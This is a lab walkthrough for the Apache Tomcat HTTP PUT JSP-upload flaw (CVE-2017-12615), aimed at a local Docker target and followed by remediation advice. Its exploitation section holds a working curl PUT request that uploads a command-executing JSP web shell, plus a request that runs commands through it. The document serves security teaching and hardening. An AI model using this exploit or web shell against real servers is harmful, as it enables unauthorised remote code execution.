# Apache Tomcat Insecure HTTP PUT Arbitrary JSP Upload RCE (CVE-2017-12615)

## Overview

Apache Tomcat vulnerability CVE-2017-12615 is a high-severity remote code execution flaw affecting Apache Tomcat versions 7.0.0 through 7.0.81. The vulnerability occurs when Tomcat is configured with the `DefaultServlet` initialized with `readonly` set to `false` in `conf/web.xml`, enabling HTTP `PUT` requests for unauthenticated clients.

Under normal circumstances, Tomcat prevents uploading `.jsp` or `.jspx` executable files via HTTP `PUT`. However, attackers can bypass this filename extension check by appending a slash (`shell.jsp/`), null byte, or Windows filesystem alternate data streams (`::$DATA`), forcing Tomcat to write an arbitrary Java Server Page (JSP) directly into the web root, yielding instant Remote Code Execution.

- **Primary Interface**: `http://localhost:8129`
- **Docker Shortcut**: `./lab start tomcat-put-rce`
- **Container Name**: `cyberlab_02_tomcat_put_rce`
- **Upstream Image**: `vulhub/tomcat:8.5.19`
- **Source of Truth**: [Vulhub Tomcat CVE-2017-12615](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615)
- **RAM Footprint**: ~200 MB

---

## Exploitation Walkthrough

### 1. Uploading Web Shell via HTTP PUT

Send an HTTP `PUT` request with a trailing slash to bypass the `.jsp` filter:

```bash
curl -i -X PUT 'http://localhost:8129/pwn.jsp/' \
  -d '<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("<pre>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
    out.println("</pre>");
}
%>'
```

Tomcat responds with `HTTP/1.1 201 Created` or `HTTP/1.1 204 No Content`.

### 2. Executing Remote Commands

Access the uploaded JSP web shell in the browser or via curl:

```bash
curl 'http://localhost:8129/pwn.jsp?cmd=id;+uname+-a'
```

---

## Defensive Remediation & Hardening

1. **Enforce Readonly DefaultServlet**:
   Ensure `readonly` is explicitly set to `true` (the default) inside `conf/web.xml`:
   ```xml
   <init-param>
       <param-name>readonly</param-name>
       <param-value>true</param-value>
   </init-param>
   ```
2. **Upgrade Apache Tomcat**:
   Upgrade to Tomcat 7.0.82, 8.5.23, 9.0.1, or newer.

---

## Video Walkthroughs & Technical References

- [POC CVE-2017-12615 : Apache Tomcat Remote Code Execution via JSP upload](https://www.youtube.com/watch?v=DqrBQbxLZmw)
- [Apache Tomcat Security Advisory](https://tomcat.apache.org/security-7.html)
- [Vulhub Tomcat CVE-2017-12615 Advisory](https://vulhub.org/#/environments/tomcat/CVE-2017-12615/)
